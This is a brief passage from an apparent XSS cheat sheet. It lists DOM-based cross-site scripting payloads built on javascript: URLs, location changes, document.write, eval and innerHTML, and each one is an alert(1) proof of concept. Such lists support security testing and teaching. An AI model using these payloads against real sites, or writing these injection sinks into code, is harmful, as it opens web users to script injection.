2. DOM-Based XSS Payloads
These payloads manipulate the Document Object Model (DOM) directly in the browser.
    javascript:alert(1)
    location.hash='javascript:alert(1)'
    location.search='javascript:alert(1)'
    location.replace('javascript:alert(1)')
    document.write('<script> alert(1) </script>')
    eval('alert(1)')
    document.body.innerHTML = '<script> alert(1) </script>'
